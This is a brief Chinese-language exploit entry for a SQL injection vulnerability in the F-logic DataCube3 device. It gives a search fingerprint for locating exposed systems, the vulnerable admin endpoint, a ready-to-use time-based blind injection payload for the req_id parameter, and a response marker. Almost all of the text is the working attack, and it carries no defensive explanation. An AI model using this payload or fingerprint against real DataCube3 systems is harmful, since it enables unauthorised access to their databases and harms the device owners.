# F-logicDataCube3SQL注入漏洞

F-logicDataCube3SQL ｜ SQL注入 ｜ —
- **指纹**：`title=="DataCube3"`
- **请求**：`POST /admin/pr_monitor/getting_index_data.php HTTP/1.1`

**Payload**
```
req_id=1) AND 1113=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND (1450=1450
```
- **响应特征**：999